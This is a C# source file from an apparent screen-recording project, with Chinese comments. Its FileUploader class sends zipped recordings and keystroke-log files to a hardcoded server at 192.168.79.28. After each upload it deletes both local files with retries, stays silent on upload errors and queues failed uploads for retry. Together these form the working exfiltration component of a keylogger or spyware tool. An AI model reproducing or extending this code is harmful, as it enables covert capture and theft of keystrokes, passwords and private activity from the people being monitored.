using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace ScreenRecorder
{
    /// <summary>
    /// 文件上传工具类，负责文件上传到远程服务器的功能
    /// </summary>
    public class FileUploader
    {
        private string remoteServerUrl = "http://192.168.79.28:5198/api/upload/file"; // 默认远程存储服务器地址
        private UploadQueueManager uploadQueueManager;

        public string RemoteServerUrl
        {
            get { return remoteServerUrl; }
            set { remoteServerUrl = value; }
        }

        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="queueManager">上传队列管理器，用于断网续传功能</param>
        public FileUploader(UploadQueueManager queueManager = null)
        {
            uploadQueueManager = queueManager ?? new UploadQueueManager();
        }

        /// <summary>
        /// 上传文件到远程服务器方法（接受键盘记录文件路径参数）
        /// </summary>
        /// <param name="zipFilePath">压缩文件路径</param>
        /// <param name="keylogFilePath">键盘记录文件路径</param>
        /// <returns>上传是否成功</returns>
        public async Task<bool> UploadToRemoteServerAsync(string zipFilePath, string keylogFilePath)
        {
            if (string.IsNullOrEmpty(zipFilePath) || !File.Exists(zipFilePath))
            {
                return false;
            }

            // 在后台线程中执行上传操作
            return await Task.Run(async () =>
            {
                try
                {
                    using (var httpClient = new HttpClient())
                    {
                        using (var fileStream = File.OpenRead(zipFilePath))
                        {
                            using (var content = new MultipartFormDataContent())
                            {
                                var fileContent = new StreamContent(fileStream);
                                content.Add(fileContent, "file", Path.GetFileName(zipFilePath));

                                var response = await httpClient.PostAsync(remoteServerUrl, content);
                                response.EnsureSuccessStatusCode();
                            }
                        }
                    }

                    // 上传成功后删除压缩文件和键盘记录文件，添加延迟重试机制
                    try
                    {
                        // 等待一段时间让系统释放文件句柄
                        await Task.Delay(500);

                        // 删除文件的列表
                        List<string> filesToDelete = new List<string> { zipFilePath };
                        if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                        {
                            filesToDelete.Add(keylogFilePath);
                        }

                        // 尝试多次删除操作
                        int maxRetries = 3;
                        int retryCount = 0;
                        bool allDeleted = false;

                        while (!allDeleted && retryCount < maxRetries)
                        {
                            allDeleted = true;
                            foreach (string filePath in filesToDelete)
                            {
                                if (File.Exists(filePath))
                                {
                                    try
                                    {
                                        File.Delete(filePath);
                                    }
                                    catch (IOException)
                                    {
                                        // 文件仍被占用，标记为未删除
                                        allDeleted = false;
                                    }
                                }
                            }

                            if (!allDeleted)
                            {
                                retryCount++;
                                if (retryCount < maxRetries)
                                {
                                    await Task.Delay(1000);
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // 自动上传过程中的错误不需要显示消息
                    }

                    return true;
                }
                catch (Exception ex)
                {
                    // 上传失败，将文件添加到上传队列
                    Console.WriteLine($"上传失败: {ex.Message}");
                    uploadQueueManager?.AddToQueue(zipFilePath, keylogFilePath);
                    return false;
                }
            });
        }

        /// <summary>
        /// 上传文件到远程服务器方法（不删除键盘记录文件的版本）
        /// </summary>
        /// <param name="zipFilePath">压缩文件路径</param>
        /// <returns>上传是否成功</returns>
        public async Task<bool> UploadToRemoteServerAsync(string zipFilePath)
        {
            return await UploadToRemoteServerAsync(zipFilePath, null);
        }

        /// <summary>
        /// 尝试上传队列中的文件
        /// </summary>
        /// <returns>成功上传的文件数</returns>
        public async Task<int> TryUploadQueueFilesAsync()
        {
            if (uploadQueueManager == null)
                return 0;
            
            return await uploadQueueManager.TryUploadQueueFilesAsync(this);
        }
    }
}